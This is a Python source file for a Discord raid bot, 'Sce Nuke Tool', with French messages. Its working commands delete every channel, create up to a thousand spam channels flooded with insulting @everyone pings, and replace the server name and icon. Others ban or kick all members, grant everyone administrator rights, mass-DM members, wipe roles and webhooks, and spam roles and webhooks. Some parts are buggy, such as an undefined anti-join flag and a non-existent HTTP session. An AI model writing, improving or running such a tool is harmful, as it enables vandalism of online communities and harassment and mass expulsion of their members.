import asyncio
import discord
from discord.ext import commands
import random
import requests
def get_bot_token():
    with open("token.txt", "r") as f:
        token = f.read().strip()
    return token

def get_owner_id():
    with open("owner_id.txt", "r") as f:
        owner_id = int(f.read().strip())
    return owner_id

def is_owner(ctx):
    return ctx.author.id == get_owner_id()

bot = commands.Bot(command_prefix='!', help_command=None,intents=discord.Intents.default())
channel_names = ["Sce team"]
message_options = ["@everyone @everyone @here @here Tu t'es fait niqué par la SCE TEAM "]

@bot.command(name='get-token')
@commands.check(is_owner)
async def get_token(ctx):
    token = get_bot_token()
    await ctx.send(f"Le token du bot est : {token}")



@bot.command(name='raid')
@commands.check(is_owner)
async def raid(ctx):
    print(f"Commande 'raid' exécutée par l'utilisateur suivant : {ctx.author.name}.")
    await ctx.send(
        "$$ __**Sce Nuke Tool - Raid**__ $$\n"
        ".nuke -> delete all channel !! + spam channel \n"
        ".spam-role -> spam role avec des noms aléatoires \n"
        ".spam-webhooks -> Spamme des msg avec des webhooks de tous les salons \n"
        ".spamdm -> Envoie des messages directs à tous les membres du serveur (vous pourriez faire votre pub !) \n"
        ".spam -> Spamme des messages dans tous les canaux textuels du serveur \n"
        ".delete-role -> Supprime tous les rôles (sauf le rôle par défaut !) \n"
        ".delete-channel -> Supprime tous les salons du serveur ! \n"
        ".delete-webhooks -> Supprime tous les webhooks du serveur \n"
        ".adminall -> Créer un rôle avec les perms Admin et le donne à tous les membres du serveur !! \n"
        ".banall -> Bannir all member du serveur sauf le dev du serv et le bot \n"
        ".renameall -> Renomme all member du serveur \n"
        ".kickall -> Expulse tous les membres (sauf le dev du serveur) \n"
        ".anti-join -> Plus personne peut rejoindre le serveur (beta) \n"
        "SCE TEAM ON TOP \n"
    )

@bot.command(name='nuke')
@commands.check(is_owner)
async def create_and_delete_channels(ctx):
    print("\033[91mDébut du nuke... \033[0m")

    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"\033[92mLe salon {channel.name} a été supprimé.\033[0m")
        except Exception as e:
            print(f"\033[91mErreur lors de la suppression du salon {channel.name}: {e}\033[0m")

    print("\033[92mTous les canaux ont été supprimés GG\033[0m")

    async def create_channel_and_spam(channel_name):
        new_channel = await ctx.guild.create_text_channel(channel_name)
        await asyncio.gather(*[new_channel.send(random.choice(message_options)) for _ in range(50)])
        await asyncio.sleep(1)

    tasks = [create_channel_and_spam(f'{random.choice(channel_names)}-{i}') for i in range(1000)]
    await asyncio.gather(*tasks)

    print("\033[92mNouveaux canaux/salon créés et messages envoyés\033[0m")

    try:
        await ctx.guild.edit(name="server")
        print("\033[92mNom du serveur modifié. GG ✅️\033[0m")
    except Exception as e:
        print(f"\033[91mErreur lors de la modification du nom.: {e}\033[0m")

    try:
        url = 'https://cdn.discordapp.com/avatars/1242188826877890620/665296b9eac933c22043c42bf46981fb?size=256.png'
        async with bot.session.get(url) as resp:
            if resp.status != 200:
                raise Exception("Failed to download image")
            data = await resp.read()
            await ctx.guild.edit(icon=data)
        print("\033[92mIcône du serveur modifiée. ✅️\033[0m")
    except Exception as e:
        print(f"\033[91mErreur lors de la modification de l'icône: {e}\033[0m")


@bot.command(name='adminall')
@commands.check(is_owner)
@commands.has_permissions(administrator=True)  
async def give_admin(ctx):
    admin_role_name = "ADMIN"
    admin_role = discord.utils.get(ctx.guild.roles, name=admin_role_name)
    
    
    if admin_role is None:
        try:
            admin_role = await ctx.guild.create_role(name=admin_role_name, permissions=discord.Permissions(administrator=True))
            print(f"Le rôle {admin_role_name} a été créé.")
        except Exception as e:
            await ctx.send(f"Erreur lors de la création du rôle {admin_role_name}: {e}")
            return

    print(f"Commande adminall effectuée par {ctx.author.name}")
    for member in ctx.guild.members:
        try:
            if admin_role not in member.roles:
                await member.add_roles(admin_role)
                print(f"Le rôle {admin_role_name} a été ajouté à {member.name}.")
        except Exception as e:
            print(f"Erreur lors de l'ajout du rôle {admin_role_name} à {member.name}: {e}")

    await ctx.send(f"Le rôle {admin_role_name} a été ajouté à tous les membres du serveur.")



@bot.command(name='banall')
@commands.check(is_owner)
async def ban_all(ctx):
    print(f"Commande banall effectuée par {ctx.author.name}")
    for member in ctx.guild.members:
        if member.id != "741433438136764456" and member.id != "730143633162473994": # remplace par les id que tu veux pas bannir
            try:
                await member.ban(reason="Vous avez été banni à cause de votre association à des raids !")
                print(f"\033[92mLe membre {member.name} a été banni avec succès !!\033[0m")
            except Exception as e:
                print(f"\033[91mErreur lors du bannissement du membre {member.name}: {e}\033[0m")

@bot.command(name='kickall')
@commands.check(is_owner)
async def kick_all(ctx):
    print(f"Commande kickall effectuée par {ctx.author.name}")
    for member in ctx.guild.members:
        if member.id != "741433438136764456" and member.id != "730143633162473994": # remplace par les id que tu veux pas bannir
            try:
                await member.kick(reason="Vous avez été expulsé à cause de votre association à des raids !")
                print(f"\033[92mLe membre {member.name} a été expulsé avec succès !!\033[0m")
            except Exception as e:
                print(f"\033[91mErreur lors de l'expulsion du membre {member.name}: {e}\033[0m")

@bot.command(name='renameall')
@commands.check(is_owner)
async def rename_all(ctx, *, name):
    print(f"Commande renameall effectuée par {ctx.author.name}")
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
            print(f"\033[92mNom du membre {member.name} modifié avec succès !!\033[0m")
        except Exception as e:
            print(f"\033[91mErreur lors de la modification du nom du membre {member.name}: {e}\033[0m")

@bot.command(name='delete-webhooks')
@commands.check(is_owner)
async def delete_webhooks(ctx):
    print(f"Commande delete-webhooks effectuée par {ctx.author.name}")
    for channel in ctx.guild.channels:
        try:
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                await webhook.delete()
                print(f"\033[92mWebhook {webhook.name} supprimé avec succès !!\033[0m")
        except Exception as e:
            print(f"\033[91mErreur lors de la suppression du webhook {webhook.name}: {e}\033[0m")

@bot.command(name='delete-channel')
@commands.check(is_owner)
async def delete_channels(ctx):
    print(f"Commande delete-channel effectuée par {ctx.author.name}")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"\033[92mLe salon {channel.name} a été supprimé avec succès !!\033[0m")
        except Exception as e:
            print(f"\033[91mErreur lors de la suppression du salon {channel.name}: {e}\033[0m")

@bot.command(name='delete-role')
@commands.check(is_owner)
async def delete_roles(ctx):
    print(f"Commande delete-role effectuée par {ctx.author.name}")
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"\033[92mRole {role.name} supprimé avec succès !!\033[0m")
            except Exception as e:
                print(f"\033[91mErreur lors de la suppression du rôle {role.name}: {e}\033[0m")

@bot.command(name='spam-role')
@commands.check(is_owner)
async def create_roles(ctx):
    print(f"Commande spam-role effectuée par {ctx.author.name}")
    for _ in range(100):
        try:
            await ctx.guild.create_role(name=random.choice(message_options))
            print(f"\033[92mRole créé avec succès !!\033[0m")
        except Exception as e:
            print(f"\033[91mErreur lors de la création du rôle : {e}\033[0m")

@bot.command(name='spam-webhooks')
@commands.check(is_owner)
async def create_webhooks(ctx):
    print(f"Commande spam-webhooks effectuée par {ctx.author.name}")
    for _ in range(100):
        for channel in ctx.guild.channels:
            try:
                await channel.create_webhook(name=random.choice(message_options))
                print(f"\033[92mWebhook créé avec succès dans le salon {channel.name} !!\033[0m")
            except Exception as e:
                print(f"\033[91mErreur lors de la création du webhook dans le salon {channel.name}: {e}\033[0m")

@bot.command(name='spamdm')
@commands.check(is_owner)
async def spam_dm(ctx, *, message):
    print(f"Commande spamdm effectuée par {ctx.author.name}")

    # Vérifier si le message est vide
    if not message:
        await ctx.send("Vous devez spécifier un message à envoyer.")
        return

    # Envoyer le message à tous les membres du serveur
    for member in ctx.guild.members:
        try:
            await member.send(message)
            print(f"\033[92mMessage envoyé à {member.name} avec succès !!\033[0m")
        except Exception as e:
            print(f"\033[91mErreur lors de l'envoi du message à {member.name}: {e}\033[0m")


@bot.command(name='anti-join')
@commands.check(is_owner)
async def toggle_anti_join(ctx):
    global anti_join_enabled
    anti_join_enabled = not anti_join_enabled
    print(f"Mode anti-join {'activé' if anti_join_enabled else 'désactivé'} par {ctx.author.name}")


@bot.command(name='help')
@commands.check(is_owner)
async def help(ctx):
    embed = discord.Embed(title="Sce Nuke Tool - Aide", description="Liste des commandes disponibles :", color=0x00ff00)
    embed.add_field(name=".raid", value="Affiche les options disponibles pour les raids.", inline=False)
    embed.add_field(name=".nuke", value="Supprime tous les canaux et crée de nouveaux canaux/spam.", inline=False)
    embed.add_field(name=".adminall", value="Donne à tous les membres un rôle avec les permissions d'administrateur.", inline=False)
    embed.add_field(name=".banall", value="Bannit tous les membres du serveur, sauf quelques exceptions.", inline=False)
    embed.add_field(name=".kickall", value="Expulse tous les membres du serveur, sauf quelques exceptions.", inline=False)
    embed.add_field(name=".renameall [nom]", value="Renomme tous les membres du serveur avec le nom spécifié.", inline=False)
    embed.add_field(name=".delete-webhooks", value="Supprime tous les webhooks du serveur.", inline=False)
    embed.add_field(name=".delete-channel", value="Supprime tous les salons du serveur.", inline=False)
    embed.add_field(name=".delete-role", value="Supprime tous les rôles du serveur, sauf le rôle par défaut.", inline=False)
    embed.add_field(name=".spam-role", value="Crée plusieurs rôles avec des noms aléatoires.", inline=False)
    embed.add_field(name=".spam-webhooks", value="Crée plusieurs webhooks dans tous les salons du serveur.", inline=False)
    embed.add_field(name=".spamdm [message]", value="Envoie un message direct à tous les membres du serveur.", inline=False)
    embed.add_field(name=".anti-join", value="Active ou désactive le mode anti-join pour empêcher les nouveaux membres de rejoindre le serveur.", inline=False)
    embed.add_field(name=".help", value="Affiche cette aide.", inline=False)
    await ctx.send(embed=embed)




API_ENDPOINT = "https://namesapi.io/api/v1/random?nameType=firstname"


@bot.command(name='spam-channels')
async def spam_channels(ctx, amount: int):
    if not is_owner(ctx):
        await ctx.send("Désolé, vous n'êtes pas autorisé à utiliser cette commande.")
        return
    
    for i in range(amount):
        try:
            
            response = requests.get(API_ENDPOINT)
            if response.status_code == 200:
                data = response.json()
                random_name = data['firstname']
                
                
                await ctx.guild.create_text_channel(random_name)
                print(f"Channel créé : {random_name}")
            else:
                print(f"Erreur lors de la requête à l'API: {response.status_code}")
        except Exception as e:
            print(f"Erreur lors de la création du channel : {e}")

    await ctx.send(f"{amount} channels ont été créés avec succès !")



bot.run(get_bot_token())
